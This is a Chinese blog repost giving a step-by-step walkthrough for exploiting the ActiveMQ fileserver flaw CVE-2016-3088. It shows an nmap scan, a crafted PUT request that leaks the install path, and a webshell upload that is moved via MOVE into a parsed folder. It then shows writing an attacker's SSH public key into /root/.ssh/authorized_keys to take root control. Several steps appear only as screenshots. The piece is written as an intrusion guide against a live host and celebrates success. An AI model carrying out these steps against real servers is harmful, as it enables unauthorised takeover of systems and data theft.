# Active MQ Fileserver 远程代码执行 （CVE-2016-3088） - 木讷 - 博客园

> 原文：[`www.cnblogs.com/iamver/p/7027422.html`](https://www.cnblogs.com/iamver/p/7027422.html)

## ActiveMQ 漏洞( CVE-2016-3088)利用拿下 root 权限主机

前言：

ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了 jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。

ActiveMQ 的 web 控制台分三个应用，admin、api 和 fileserver，其中 admin 是管理员页面，api 是接口，fileserver 是储存文件的接口；admin 和 api 都需要登录后才能使用，fileserver 无需登录；

fileserver 是一个 RESTful API 接口，我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作；

利用方法：写入 webshell，好处是门槛低更方便，但 fileserver 不解析 jsp，admin 和 api 两个应用都需要登录才能访问，所以有点鸡肋；写入 cron 或 ssh key，好处是直接反弹拿 shell，也比较方便，缺点是需要 root 权限。

**1.扫描目标主机**

> MacPC:~ liuxin$ nmap -Pn -p8161 -sV 192.168.xx.xx --open
> 
> Starting Nmap 6.47 ( http://nmap.org ) at 2016-07-19 11:23 CST
> Nmap scan report for 192.168.xx.xx
> Host is up (0.054s latency).
> PORT     STATE SERVICE VERSION
> 8161/tcp open  http    Jetty 7.6.7.v20120910

![](img/64437d53fe251c485d9ce85e9684506d.png)
**2.爆 ActiveMQ 路径**

> PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
> 
> Host: 192.168.12.89:8161
> 
> Content-Length: 13
> 
> fdsafdsfadfas

返回如下

> HTTP/1.1 500 /home/pbcsapp/apache-activemq-5.7.0/webapps/fileserver//.././ (No such file or directory)
> 
> Content-Length: 0
> 
> Server: Jetty(7.6.7.v20120910)

得到绝对路径

**3.上传木马并 MOVE 到 fileserver/目录**

![](img/33c6f7c16b8d1f783b34af8c39e55799.png)
![](img/3feee0852104d6b074f0f1b5486f94af.png)
**浏览器访问木马**

![](img/0f2daa7b931b4981bfad901ff777322f.png)
发现木马文件上传成功后并不能执行，菜刀和 K8 一句话都失败。（该目录不能解析 JSP）

因此需 move 到 admin 或 api 目录下执行。

![](img/a5fce61b701ddf5c81f6382da56b64be.png)

**4.转换思路直接获取目标 root 权限**

**4.1 本地使用 ssh-keygen 生成密钥对（`.ssh`目录下）**

> # ssh-keygen -t RSA

**4.2 上传`id_rsa.pub`到服务器，然后移动到`/root/.ssh/`并重命名为`authorized_keys`；**

![](img/696aecc9240b40ab2f5192d928e50552.png)
**![](img/82f64259e12ea1d272fd8906dd59d4b0.png)**

**![](img/f8b020d088aa7f366990a0ecbabc5dc0.png)**

**4.3 远程直接访问目标主机**

![](img/7f2b4d2087db5a73a2284207cfcc07b3.png)
搞定！

**受影响系统：**

> Apache Group ActiveMQ 5.0.0 - 5.13.2

转自：http://www.lofter.com/tag/CVE-2016-3088 参考链接：　　　　[`paper.seebug.org/346/`](https://paper.seebug.org/346/)　　　　[`www.bodkin.ren/index.php/archives/219/`](https://www.bodkin.ren/index.php/archives/219/)